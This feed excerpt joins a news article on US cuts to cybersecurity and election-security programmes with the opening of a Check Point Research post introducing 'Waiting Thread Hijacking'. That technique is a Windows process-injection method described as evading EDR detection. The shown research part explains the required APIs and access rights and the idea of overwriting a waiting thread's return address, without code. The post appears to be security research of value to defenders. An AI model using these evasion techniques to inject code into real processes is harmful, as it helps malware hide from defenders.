&lt;p&gt;A &lt;a href="https://www.washingtonpost.com/national-security/2025/03/01/trump-putin-russia-cyber-offense-cisa" rel="noopener" target="_blank"&gt;follow-up story&lt;/a&gt; from &lt;strong&gt;The Washington Post&lt;/strong&gt; cited officials saying Cyber Command had received an order to halt active operations against Russia, but that the pause was intended to last only as long as negotiations with Russia continue.&lt;/p&gt;
&lt;p&gt;The Department of Defense responded on Twitter/X that Hegseth had &amp;#8220;neither canceled nor delayed any cyber operations directed against malicious Russian targets and there has been no stand-down order whatsoever from that priority.&amp;#8221;&lt;/p&gt;
&lt;p&gt;But on March 19, Reuters &lt;a href="https://www.yahoo.com/news/exclusive-us-suspends-efforts-counter-060549726.html" rel="noopener" target="_blank"&gt;reported&lt;/a&gt; several U.S. national security agencies have halted work on a coordinated effort to counter Russian sabotage, disinformation and cyberattacks.&lt;/p&gt;
&lt;p&gt;&amp;#8220;Regular meetings between the National Security Council and European national security officials have gone unscheduled, and the NSC has also stopped formally coordinating efforts across U.S. agencies, including with the FBI, the Department of Homeland Security and the State Department,&amp;#8221; Reuters reported, citing current and former officials.&lt;span id="more-70970"&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h2&gt;TARIFFS VS TYPHOONS&lt;/h2&gt;
&lt;p&gt;President&amp;#8217;s Trump&amp;#8217;s institution of 125% tariffs on goods from China has seen Beijing strike back with 84 percent tariffs on U.S. imports. Now, some security experts are warning that the trade war &lt;a href="https://www.theregister.com/2025/04/10/trade_war_reaches_cyberspace/" rel="noopener" target="_blank"&gt;could spill over into a cyber conflict&lt;/a&gt;, given China&amp;#8217;s successful efforts to burrow into America&amp;#8217;s critical infrastructure networks.&lt;/p&gt;
&lt;p&gt;Over the past year, a number of Chinese government-backed digital intrusions have come into focus, including a sprawling espionage campaign involving the compromise of &lt;a href="https://www.cybersecuritydive.com/news/salt-typhoon-telecom-attacks-lax-security/736233/" rel="noopener" target="_blank"&gt;at least nine U.S. telecommunications providers&lt;/a&gt;. Dubbed &amp;#8220;&lt;a href="https://www.nytimes.com/2024/10/26/us/politics/salt-typhoon-hack-what-we-know.html" rel="noopener" target="_blank"&gt;Salt Typhoon&lt;/a&gt;&amp;#8221; by Microsoft, these telecom intrusions were pervasive enough that CISA and the FBI in December 2024 &lt;a href="https://www.cisa.gov/resources-tools/resources/enhanced-visibility-and-hardening-guidance-communications-infrastructure" rel="noopener" target="_blank"&gt;warned Americans&lt;/a&gt; against communicating sensitive information over phone networks, urging people instead to use encrypted messaging apps (like Signal).&lt;/p&gt;
&lt;p&gt;The other broad ranging China-backed campaign is known as &amp;#8220;&lt;a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-038a" rel="noopener" target="_blank"&gt;Volt Typhoon&lt;/a&gt;,&amp;#8221; which CISA described as &amp;#8220;state-sponsored cyber actors seeking to pre-position themselves on IT networks for disruptive or destructive cyberattacks against U.S. critical infrastructure in the event of a major crisis or conflict with the United States.&amp;#8221;&lt;/p&gt;
&lt;p&gt;Responsibility for determining the root causes of the Salt Typhoon security debacle fell to the &lt;a href="https://en.wikipedia.org/wiki/Cyber_Safety_Review_Board" rel="noopener" target="_blank"&gt;Cyber Safety Review Board&lt;/a&gt; (CSRB), a nonpartisan government entity established in February 2022 with a mandate to investigate the security failures behind major cybersecurity events. But on his first full day back in the White House, President Trump dismissed all 15 CSRB advisory committee members &amp;#8212; likely because those advisers included Chris Krebs.&lt;/p&gt;
&lt;p&gt;Last week, &lt;strong&gt;Sen. Ron Wyden&lt;/strong&gt; (D-Ore.) placed a hold on Trump&amp;#8217;s nominee to lead CISA, saying the hold would continue unless the agency published a report on the telecom industry hacks, as promised.&lt;/p&gt;
&lt;div class="text__text__1FZLe text__dark-grey__3Ml43 text__regular__2N1Xr text__small__1kGq2 body__full_width__ekUdw body__small_body__2vQyf article-body__paragraph__2-BtD"&gt;
&lt;p&gt;&amp;#8220;CISA&amp;#8217;s multi-year cover up of the phone companies&amp;#8217; negligent cybersecurity has real consequences,&amp;#8221; Wyden said in &lt;a href="https://www.wyden.senate.gov/news/press-releases/wyden-places-hold-on-top-cybersecurity-nominee-to-force-release-of-important-details-on-security-threats-to-us-phone-networks" rel="noopener" target="_blank"&gt;a statement&lt;/a&gt;. &amp;#8220;Congress and the American people have a right to read this report.&amp;#8221;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;The Wall Street Journal&lt;/strong&gt; reported last week Chinese officials acknowledged in a secret December meeting that Beijing was behind the widespread telecom industry compromises.&lt;/p&gt;
&lt;p&gt;&amp;#8220;The Chinese official&amp;#8217;s remarks at the December meeting were indirect and somewhat ambiguous, but most of the American delegation in the room interpreted it as a tacit admission and a warning to the U.S. about Taiwan,&amp;#8221; The Journal&amp;#8217;s &lt;strong&gt;Dustin Volz&lt;/strong&gt; &lt;a href="https://www.wsj.com/politics/national-security/in-secret-meeting-china-acknowledged-role-in-u-s-infrastructure-hacks-c5ab37cb" rel="noopener" target="_blank"&gt;wrote&lt;/a&gt;, citing a former U.S. official familiar with the meeting.&lt;/p&gt;
&lt;p&gt;Meanwhile, China continues to take advantage of the mass firings of federal workers. On April 9, the &lt;strong&gt;National Counterintelligence and Security Center&lt;/strong&gt; &lt;a href="https://www.dni.gov/files/NCSC/documents/products/2025-04-08-NCSC-FBI-DCSA-OnlineTargetingUSGEmployees.pdf" rel="noopener" target="_blank"&gt;warned&lt;/a&gt; (PDF) that Chinese intelligence entities are pursuing an online effort to recruit recently laid-off U.S. employees.&lt;/p&gt;
&lt;p&gt;&amp;#8220;Foreign intelligence entities, particularly those in China, are targeting current and former U.S. government (USG) employees for recruitment by posing as consulting firms, corporate headhunters, think tanks, and other entities on social and professional networking sites,&amp;#8221; the alert warns. &amp;#8220;Their deceptive online job offers, and other virtual approaches, have become more sophisticated in targeting unwitting individuals with USG backgrounds seeking new employment.&amp;#8221;&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_70985" style="width: 759px;"&gt;&lt;a href="https://krebsonsecurity.com/wp-content/uploads/2025/04/dni-china-hiring.png" rel="noopener" target="_blank"&gt;&lt;img alt="" class="wp-image-70985" height="416" src="https://krebsonsecurity.com/wp-content/uploads/2025/04/dni-china-hiring.png" width="749" /&gt;&lt;/a&gt;&lt;p class="wp-caption-text" id="caption-attachment-70985"&gt;Image: Dni.gov&lt;/p&gt;&lt;/div&gt;
&lt;h2&gt;ELECTION THREATS&lt;/h2&gt;
&lt;p&gt;As Reuters &lt;a href="https://www.reuters.com/world/us-suspends-some-efforts-counter-russian-sabotage-trump-moves-closer-putin-2025-03-19/" rel="noopener" target="_blank"&gt;notes&lt;/a&gt;, the FBI last month ended an effort to counter interference in U.S. elections by foreign adversaries including Russia, and put on leave staff working on the issue at the Department of Homeland Security.&lt;/p&gt;
&lt;p&gt;Meanwhile, the U.S. Senate is now considering a &lt;a href="https://www.nytimes.com/2025/04/10/us/politics/house-citizenship-elections-save-act.html" rel="noopener" target="_blank"&gt;House-passed bill&lt;/a&gt; dubbed the &amp;#8220;&lt;strong&gt;Safeguard American Voter Eligibility (SAVE) Act&lt;/strong&gt;,&amp;#8221; which would order states to obtain proof of citizenship, such as a passport or a birth certificate, &lt;a href="https://www.nytimes.com/2025/04/10/us/politics/house-citizenship-elections-save-act.html" rel="noopener" target="_blank"&gt;in person from those seeking to register to vote&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Critics say the SAVE Act could disenfranchise millions of voters and discourage eligible voters from registering to vote. What&amp;#8217;s more, documented cases of voter fraud are few and far between, as is voting by non-citizens. Even the conservative &lt;strong&gt;Heritage Foundation&lt;/strong&gt; acknowledges as much: An interactive &amp;#8220;&lt;a href="https://electionfraud.heritage.org/search" rel="noopener" target="_blank"&gt;election fraud map&lt;/a&gt;&amp;#8221; published by Heritage lists just 1,576 convictions or findings of voter fraud between 1982 and the present day.&lt;/p&gt;
&lt;p&gt;Nevertheless, the GOP-led House passed the SAVE Act with the help of four Democrats. Its passage in the Senate will require support from at least seven Democrats, Newsweek &lt;a href="https://www.newsweek.com/democrats-who-could-cross-aisle-save-act-2058792" rel="noopener" target="_blank"&gt;writes&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;In February, CISA cut roughly 130 employees, including its election security advisors. The agency also was forced to freeze all election security activities pending an internal review. The review was &lt;a href="https://www.brennancenter.org/our-work/research-reports/how-federal-government-undermining-election-security" rel="noopener" target="_blank"&gt;reportedly&lt;/a&gt; completed in March, but the Trump administration has said the findings would not be made public, and there is no indication of whether any cybersecurity support has been restored.&lt;/p&gt;
&lt;p&gt;Many state leaders have voiced anxiety over the administration&amp;#8217;s cuts to CISA programs that provide assistance and threat intelligence to election security efforts. &lt;strong&gt;Iowa Secretary of State Paul Pate&lt;/strong&gt; last week &lt;a href="https://www.thegazette.com/campaigns-elections/iowas-top-elections-official-concerned-over-cybersecurity-funding-pause/" rel="noopener" target="_blank"&gt;told&lt;/a&gt; the &lt;strong&gt;PBS&lt;/strong&gt; show I&lt;strong&gt;owa Press&lt;/strong&gt; he would not want to see those programs dissolve.&lt;/p&gt;
&lt;p&gt;&amp;#8220;If those (systems) were to go away, it would be pretty serious,&amp;#8221; Pate said. &amp;#8220;We do count on a lot those cyber protections.&amp;#8221;&lt;/p&gt;
&lt;p&gt;Pennsylvania&amp;#8217;s &lt;strong&gt;Secretary of the Commonwealth Al Schmidt&lt;/strong&gt; recently warned the CISA election security cuts would make elections less secure, and said no state on its own can replace federal election cybersecurity resources.&lt;/p&gt;
&lt;p&gt;The &lt;strong&gt;Pennsylvania Capital-Star&lt;/strong&gt; &lt;a href="https://penncapital-star.com/election-2025/no-state-on-its-own-can-replace-federal-election-cybersecurity-resources-pa-voting-official-says/" rel="noopener" target="_blank"&gt;reports&lt;/a&gt; that several local election offices received bomb threats around the time polls closed on Nov. 5, and that in the week before the election a fake video showing mail-in ballots cast for Trump and Sen. Dave McCormick (R-Pa.) being destroyed and thrown away was linked to a Russian disinformation campaign.&lt;/p&gt;
&lt;p&gt;&amp;#8220;CISA was able to quickly identify not only that it was fraudulent, but also the source of it, so that we could share with our counties and we could share with the public so confidence in the election wasn’t undermined,&amp;#8221; Schmidt said.&lt;/p&gt;
&lt;p&gt;According to &lt;a href="https://archive.ph/InCFx#selection-2339.13-2339.483" rel="noopener" target="_blank"&gt;CNN&lt;/a&gt;, the administration&amp;#8217;s actions have deeply alarmed state officials, who warn the next round of national elections will be seriously imperiled by the cuts. A bipartisan association representing 46 secretaries of state, and several individual top state election officials, have pressed the White House about how critical functions of protecting election security will perform going forward. However, CNN reports they have yet to receive clear answers.&lt;/p&gt;
&lt;p&gt;Nevada and 18 other states are suing Trump over &lt;a href="https://www.whitehouse.gov/presidential-actions/2025/03/preserving-and-protecting-the-integrity-of-american-elections/" rel="noopener" target="_blank"&gt;an executive order he issued on March 25&lt;/a&gt; that asserts the executive branch has broad authority over state election procedures.&lt;/p&gt;
&lt;p&gt;&amp;#8220;None of the president’s powers allow him to change the rules of elections,&amp;#8221; Nevada Secretary of State &lt;strong&gt;Cisco Aguilar&lt;/strong&gt; wrote in &lt;a href="https://www.msnbc.com/opinion/msnbc-opinion/nevada-18-states-are-suing-trump-election-executive-order-rcna200427" rel="noopener" target="_blank"&gt;an April 11 op-ed&lt;/a&gt;. &amp;#8220;That is an intentional feature of our Constitution, which the Framers built in to ensure election integrity. Despite that, Trump is seeking to upend the voter registration process; impose arbitrary deadlines on vote counting; allow an unelected and unaccountable billionaire to invade state voter rolls; and withhold congressionally approved funding for election security.&amp;#8221;&lt;/p&gt;
&lt;p&gt;The order instructs the &lt;strong&gt;U.S. Election Assistance Commission&lt;/strong&gt; to abruptly amend the voluntary federal guidelines for voting machines without going through the processes mandated by federal law. And it calls for allowing the administrator of the so-called &lt;strong&gt;Department of Government Efficiency&lt;/strong&gt; (DOGE), along with DHS, to review state voter registration lists and other records to identify non-citizens.&lt;/p&gt;
&lt;p&gt;The Atlantic&amp;#8217;s &lt;strong&gt;Paul Rosenzweig&lt;/strong&gt; notes that the chief executive of the country &amp;#8212; whose unilateral authority the Founding Fathers most feared &amp;#8212; has literally no role in the federal election system.&lt;/p&gt;
&lt;p&gt;&amp;#8220;Trump&amp;#8217;s executive order on elections ignores that design entirely,&amp;#8221; Rosenzweig &lt;a href="https://www.theatlantic.com/ideas/archive/2025/04/trump-election-rules-changes/682394/" rel="noopener" target="_blank"&gt;wrote&lt;/a&gt;. &amp;#8220;He is asserting an executive-branch role in governing the mechanics of a federal election that has never before been claimed by a president. The legal theory undergirding this assertion &amp;#8212; that the president&amp;#8217;s authority to enforce federal law enables him to control state election activity &amp;#8212; is as capacious as it is frightening.&amp;#8221;&lt;/p&gt;

&lt;p&gt;The post &lt;a href="https://research.checkpoint.com/2025/waiting-thread-hijacking/"&gt;Waiting Thread Hijacking: A Stealthier Version of Thread Execution Hijacking&lt;/a&gt; appeared first on &lt;a href="https://research.checkpoint.com"&gt;Check Point Research&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;p&gt;&lt;strong&gt;Research by:&lt;/strong&gt; hasherezade&lt;/p&gt;



&lt;h1 class="wp-block-heading" id="key-points"&gt;Key Points&lt;/h1&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Process Injection is one of the important techniques in the attackers’ toolkit. In the constant cat-and-mouse game, attackers try to invent its new implementations that bypass defenses, using creative methods and lesser-known APIs.&lt;/li&gt;



&lt;li&gt;Combining common building blocks in an atypical way, Check Point Research was able to create a much stealthier version of a known method, Thread Execution Hijacking.&lt;/li&gt;
&lt;/ul&gt;



&lt;h1 class="wp-block-heading" id="introduction"&gt;Introduction&lt;/h1&gt;



&lt;p&gt;Process injection is one of the&amp;nbsp;&lt;a href="https://attack.mitre.org/techniques/T1055"&gt;important techniques used by attackers&lt;/a&gt;. We can find its variants implemented in almost every malware. It serves purposes such as:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;defense evasion: hiding malicious modules under the cover of a different process&lt;/li&gt;



&lt;li&gt;interference with existing processes: reading their memory, hooking used APIs, etc.&lt;/li&gt;



&lt;li&gt;privilege escalation&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;In&amp;nbsp;&lt;a href="https://research.checkpoint.com/2024/thread-name-calling-using-thread-name-for-offense/"&gt;our previous blog&lt;/a&gt;&amp;nbsp;on&amp;nbsp;&lt;a href="https://attack.mitre.org/techniques/T1055/"&gt;process injections&lt;/a&gt;&amp;nbsp;we explained the foundations of this topic and basic ideas behind detection and prevention. We also proposed a new technique dubbed&amp;nbsp;&lt;a href="https://research.checkpoint.com/2024/thread-name-calling-using-thread-name-for-offense/"&gt;Thread Name-Calling&lt;/a&gt;&amp;nbsp;&amp;#8211; abusing the Thread Name API that was originally intended to assign names to running threads. The technique allowed writing to a process using a handle without write access. Remote execution was achieved through&amp;nbsp;&lt;a href="https://repnz.github.io/posts/apc/user-apc/#ntqueueapcthreadex2-some-new-friends-in-the-fast-ring"&gt;the new API for Asynchronous Procedure Calls (APC)&lt;/a&gt;, requesting a Special User APC. With the help of those building blocks, we were able to inject a payload and run it without being noticed by most tested EDRs (Endpoint Detection &amp;amp; Response systems). While remote write was implemented using an unexpected API, execution wasn’t completely novel since it was a variant of&amp;nbsp;&lt;a href="https://attack.mitre.org/techniques/T1055/004"&gt;APC injection&lt;/a&gt;.&lt;/p&gt;



&lt;p&gt;In the current research, we aim for the same goal: stealthy injection into a running process. This time we approach the problem from the opposite direction. We use common allocate and write primitives to achieve unexpected code execution. Furthermore, we show how to extend the implementation and obfuscate the called sequence of APIs in order to tamper behavioral signatures that could be used for detection. The described technique intercepts the flow of a waiting thread and misuses it for the execution of an implant &amp;#8211; that’s why we dubbed it Waiting Thread Hijacking (WTH). It can be treated as an evolution of classic&amp;nbsp;&lt;a href="https://attack.mitre.org/techniques/T1055/003/"&gt;Thread Hijacking&lt;/a&gt;. Unlike the older method, WTH avoids using APIs that trigger most alerts, such as&amp;nbsp;&lt;code&gt;SuspendThread&lt;/code&gt;&amp;nbsp;/&amp;nbsp;&lt;code&gt;ResumeThread&lt;/code&gt;&amp;nbsp;and&amp;nbsp;&lt;a href="https://medium.com/tenable-techblog/api-series-setthreadcontext-d08c9f84458d"&gt;&lt;code&gt;SetThreadContext&lt;/code&gt;&lt;/a&gt;.&lt;/p&gt;



&lt;p&gt;It involves handles with the following access:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;For the target process:&amp;nbsp;&lt;code&gt;PROCESS_VM_OPERATION&lt;/code&gt;,&amp;nbsp;&lt;code&gt;PROCESS_VM_READ&lt;/code&gt;,&amp;nbsp;&lt;code&gt;PROCESS_VM_WRITE&lt;/code&gt;&lt;/li&gt;



&lt;li&gt;For the target thread:&amp;nbsp;&lt;code&gt;THREAD_GET_CONTEXT&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;Used APIs:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;code&gt;NtQuerySystemInformation&lt;/code&gt;&amp;nbsp;(with a parameter of&amp;nbsp;&lt;code&gt;SystemProcessInformation&lt;/code&gt;&amp;nbsp;)&lt;/li&gt;



&lt;li&gt;&lt;code&gt;GetThreadContext&lt;/code&gt;&lt;/li&gt;



&lt;li&gt;&lt;code&gt;ReadProcessMemory&lt;/code&gt;&lt;/li&gt;



&lt;li&gt;&lt;code&gt;VirtualAllocEx&lt;/code&gt;&lt;/li&gt;



&lt;li&gt;&lt;code&gt;WriteProcessMemory&lt;/code&gt;&lt;/li&gt;



&lt;li&gt;&lt;code&gt;VirtualProtectEx&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;The considered target is a 64-bit process with&amp;nbsp;&lt;a href="https://jsecurity101.medium.com/better-know-a-data-source-process-integrity-levels-8338f3b74990"&gt;medium integrity&lt;/a&gt;.&lt;/p&gt;



&lt;h1 class="wp-block-heading" id="executing-remote-code"&gt;Executing Remote Code&lt;/h1&gt;



&lt;p&gt;To prevent remote code execution, AVs and EDRs try to monitor APIs related to known techniques (examples of monitored functions can be found in Mr-Un1k0d3r’s repository: &lt;a href="https://github.com/Mr-Un1k0d3r/EDRs" rel="noreferrer noopener" target="_blank"&gt;https://github.com/Mr-Un1k0d3r/EDRs&lt;/a&gt;). The implementation of restrictions differs from product to product. While some products tolerate remote allocation and write, an attempt to run the implant will surely result in detection. Options for triggering execution are very limited, and all APIs meant for this purpose are closely watched. That’s why finding a new, unexpected way to do so is one of the biggest challenges attackers and red teamers face while trying to implement code injection.&lt;/p&gt;



&lt;p&gt;The basic constraint is that code runs on &lt;a href="https://www.microsoftpressstore.com/articles/article.aspx?p=2233328&amp;amp;seqNum=4"&gt;threads&lt;/a&gt;. This leaves us with two possibilities: either to create a new thread in the target process, or to use some of the existing ones. An alternative way to run code are &lt;a href="https://www.ired.team/offensive-security/code-injection-process-injection/executing-shellcode-with-createfiber"&gt;fibers&lt;/a&gt; (example: &lt;em&gt;ImmoralFiber, &lt;a href="https://github.com/JanielDary/ImmoralFiber"&gt;BlackHat Asia 2024&lt;/a&gt;&lt;/em&gt;), although at a low level they are still &lt;a href="https://learn.microsoft.com/en-us/windows/win32/procthread/fibers"&gt;managed by threads&lt;/a&gt;. While using fibers can help in hiding execution within a local process, it is not much helpful in achieving remote execution. In order to use them to run code within a remote process, the target must already have existing fibers. This drastically narrows down the list of possible targets, making this method unusable in most real-life scenarios.&lt;/p&gt;



&lt;p&gt;The common approaches to remotely execute injected code:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Remote thread creation&lt;/li&gt;



&lt;li&gt;Adding a function to the APC queue of an existing thread&lt;/li&gt;



&lt;li&gt;Direct manipulation of an existing thread’s context (&lt;code&gt;GetThreadContext&lt;/code&gt;/&amp;nbsp;&lt;code&gt;SetThreadContext&lt;/code&gt;). This includes using&amp;nbsp;&lt;a href="https://www.alex-ionescu.com/rtlremotecall/"&gt;&lt;code&gt;RtlRemoteCall&lt;/code&gt;&lt;/a&gt;&amp;nbsp;API (since it calls&amp;nbsp;&lt;code&gt;GetThreadContext&lt;/code&gt;/&amp;nbsp;&lt;code&gt;SetThreadContext&lt;/code&gt;&amp;nbsp;underneath).&lt;/li&gt;



&lt;li&gt;Installing hooks&lt;/li&gt;



&lt;li&gt;Replacing the defined callbacks&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;Let’s analyze each option one by one.&lt;/p&gt;



&lt;p&gt;Creating a remote thread is straightforward, and involves using one of the APIs from the&amp;nbsp;&lt;a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadscreateremotethread"&gt;CreateRemoteThread&lt;/a&gt;&amp;nbsp;series. Although we may&amp;nbsp;&lt;a href="https://aliongreen.github.io/posts/remote-thread-injection.html"&gt;apply it in various ways&lt;/a&gt;, calling high- or low-level versions of those functions or even using raw syscalls, the end result won’t be very stealthy. Creation of a new thread generates a kernel callback that makes an EDR quickly notified about the suspicious intentions (via&amp;nbsp;&lt;a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetcreatethreadnotifyroutine"&gt;&lt;code&gt;PsSetCreateThreadNotifyRoutine&lt;/code&gt;&lt;/a&gt;/&amp;nbsp;&lt;a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetcreatethreadnotifyroutineex"&gt;&lt;code&gt;Ex&lt;/code&gt;&lt;/a&gt;&lt;strong&gt;)&lt;/strong&gt;,&lt;/p&gt;



&lt;p&gt;This leads to the conclusion that what pays off more is giving up on creating new threads altogether, and somehow hopping onto an existing one. The most straightforward and convenient way is using APC, as it was explained in details in the&amp;nbsp;&lt;a href="https://research.checkpoint.com/2024/thread-name-calling-using-thread-name-for-offense/"&gt;blog about Thread Name-Calling&lt;/a&gt;. This method however also has its drawbacks. In this scenario a kernel callback won’t be triggered, but yet, it generates an&amp;nbsp;&lt;a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/devtest/event-tracing-for-windows--etw-"&gt;ETW event&lt;/a&gt;, for which an AV/EDR product can listen. Second, a handle to the thread must be opened with&amp;nbsp;&lt;code&gt;THREAD_SET_CONTEXT&lt;/code&gt;&amp;nbsp;access. The event of opening a handle also generates a kernel callback (that can be monitored in kernel mode via&amp;nbsp;&lt;a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-obregistercallbacks"&gt;ObRegisterCallbacks&lt;/a&gt;), so we should tend to avoid suspicious flags, and minimize the requested access.&lt;/p&gt;



&lt;p&gt;Direct manipulation of an existing thread is a part of another old and well-known method, called&amp;nbsp;&lt;a href="https://attack.mitre.org/techniques/T1055/003/"&gt;thread execution hijacking&lt;/a&gt;. It involves finding a thread within the target process, suspending it, changing its context to redirect the execution flow into our own code, and then resuming it. Just like APC injection, it requires the thread handle to be open with&amp;nbsp;&lt;code&gt;THREAD_SET_CONTEXT&lt;/code&gt;, plus another suspicious flag:&amp;nbsp;&lt;code&gt;THREAD_SUSPEND_RESUME&lt;/code&gt;. Another problem is that the APIs related to this method are usually monitored, which will get us stopped by an EDR. If we give up on all functions that require modifications of the thread context, we are left with simple writes to the target process’ memory. This seems like not much, but using it creatively can still achieve code execution.&lt;/p&gt;



&lt;p&gt;One of the basic ideas from this category is API hooking. We can predict that there are some functions within the process that will be called at some point. If we intercept them, we can get our code to run alongside. There are multiple different options to implement hooks: inline as well as in IAT (Import Address Table) or EAT (Export Address Table). However, installing them requires overwriting a part of the loaded DLL, which often raises alerts.&lt;/p&gt;



&lt;p&gt;The more creative approach is based on the fact that a process may use various callbacks executed on particular events. If we overwrite a pointer to the callback function, we can force our code to be executed instead. There are a variety of publications detailing different methods from this group. A few examples include:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;a href="https://attack.mitre.org/techniques/T1055/005/"&gt;Overwriting TLS callbacks&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://attack.mitre.org/techniques/T1574/013/"&gt;Overwriting Kernel Callback Table&lt;/a&gt;&lt;/li&gt;

&lt;li&gt;Overwriting ETW callbacks (example:&amp;nbsp;&lt;a href="https://web.archive.org/web/20240324163515/https://modexp.wordpress.com/2020/04/08/red-teams-etw/"&gt;odzhan blog&lt;/a&gt;&amp;nbsp;#2)&lt;/li&gt;

&lt;/ul&gt;



&lt;p&gt;An interesting and novel addition to this group was a technique described by Alon Leviev in his publication on&amp;nbsp;&lt;a href="https://www.safebreach.com/blog/process-injection-using-windows-thread-pools/"&gt;Thread “Pool-Party”&lt;/a&gt;. His idea is based on the fact that Windows makes heavy use of&amp;nbsp;&lt;a href="https://www.microsoftpressstore.com/articles/article.aspx?p=2233328&amp;amp;seqNum=6"&gt;thread pools&lt;/a&gt;. By getting a handle to the Worker Factory of the target, we can manipulate its structure to link to our implant and enforce its execution. For example, we can overwrite the start address within the Worker Factory’s structure redirecting it to our shellcode, and then trigger its run. It is also possible to install a new work item into the remote process by manually writing its structure and attaching it to the Worker Factory’s queue.&lt;/p&gt;



&lt;p&gt;In the solution that we are going to introduce, some of the observations mentioned in the Alon’s paper will be used as well. However, the whole technique is much simpler and based on manipulating one of the threads that are products of the factory rather than the factory itself.&lt;/p&gt;



&lt;h1 class="wp-block-heading" id="what-the-hell-is-waiting-thread-hijacking"&gt;What Problems Waiting Thread Hijacking Solves?&lt;/h1&gt;



&lt;p&gt;Waiting Thread Hijacking is a method inspired by the concepts of the&amp;nbsp;&lt;a href="https://attack.mitre.org/techniques/T1055/003/"&gt;classic Thread Execution Hijacking&lt;/a&gt;, and the research about the&amp;nbsp;&lt;a href="https://www.microsoftpressstore.com/articles/article.aspx?p=2233328&amp;amp;seqNum=6"&gt;Thread Pool&lt;/a&gt;. However, its usage is not strictly limited to the threads belonging to the thread pool.&lt;/p&gt;



&lt;p&gt;Let’s think about what the biggest problems with the classic Thread Execution Hijacking are.&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;First of all, we have to suspend a remote thread, and resume it afterwards. This may create some synchronization issues in the target application. But most importantly, it forces us to use&amp;nbsp;&lt;code&gt;SuspendThread&lt;/code&gt;/&amp;nbsp;&lt;code&gt;ResumeThread&lt;/code&gt;&amp;nbsp;API, and the thread handle with the access&amp;nbsp;&lt;code&gt;THREAD_SUSPEND_RESUME&lt;/code&gt;. Those are suspicious indicators that will surely be observed by an EDR.
&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;em&gt;If only we could find a process where this is done automatically on the target side, we would avoid this hurdle…&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;



&lt;li&gt;Second, we need to redirect execution of the suspended thread to the implant. In the classic version of this technique,&amp;nbsp;&lt;code&gt;SetThreadContext&lt;/code&gt;&amp;nbsp;(or its low-level equivalent,&amp;nbsp;&lt;a href="https://ntdoc.m417z.com/ntsetcontextthread"&gt;&lt;code&gt;NtSetContextThread&lt;/code&gt;&lt;/a&gt;) is used. The redirection is done by modifying the Instruction Pointer. The direct setting of the thread context is very suspicious, and&amp;nbsp;&lt;a href="https://medium.com/tenable-techblog/api-series-setthreadcontext-d08c9f84458d"&gt;noisy (generates two different ETW events)&lt;/a&gt;. It will most likely get us flagged by the AV/EDR. Also, it requires&amp;nbsp;&lt;code&gt;THREAD_SET_CONTEXT&lt;/code&gt;&amp;nbsp;access on the handle, which we would like to avoid.
&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;em&gt;Is it possible to change the thread’s execution flow without manually modifying its context?&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;



&lt;li&gt;Finally, returning to the original execution flow won’t be seamless. We need to store the original thread context somewhere, and restore it at our shellcode’s exit. The stability of the target process may be at risk.
&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;em&gt;Is it possible to just return to the original execution without the need to set the thread context again?&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;It turns out, those limitations can be overcome with a few simple tricks.&lt;/p&gt;



&lt;p&gt;An old-school step used in the exploitation of buffer overflows is replacing the return address of the function with our own address. A working exploit may involve other primitives, like allocation of executable memory, or adding the execution permission. In order to circumvent this, restrictions like&amp;nbsp;&lt;a href="https://www.ired.team/offensive-security/defense-evasion/acg-arbitrary-code-guard-processdynamiccodepolicy"&gt;DCP (Dynamic Code Prohibited)&lt;/a&gt; have been invented. Those are also the typical events that Anti-exploit software will monitor. However, DCP policies do not apply if the executable memory is allocated within the target via an external process. It turns out, that the event of replacing the return address may also go unnoticed if it is done externally. In the current technique, we take advantage of it.&lt;/p&gt;



&lt;p&gt;Still, we need to be very selective under which circumstances the return address can be overwritten. Since we have to avoid manual suspending/resuming of threads, we will use the threads that let us achieve the same effect by their own features. That is, waiting threads, which return addresses we can manipulate without destabilizing the whole application. Such threads can easily be found thanks to Thread Pools.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="thread-pools-basics"&gt;Thread Pools Basics&lt;/h2&gt;



&lt;p&gt;The&amp;nbsp;&lt;a href="https://learn.microsoft.com/en-us/windows/win32/procthread/thread-pools"&gt;concept of Thread Pools&lt;/a&gt;&amp;nbsp;has been around since early editions of Windows, and its modern form was introduced in Vista. The details of the API, and its evolution are&amp;nbsp;&lt;a href="https://learn.microsoft.com/en-us/windows/win32/procthread/thread-pools"&gt;described on MSDN&lt;/a&gt;.&lt;/p&gt;



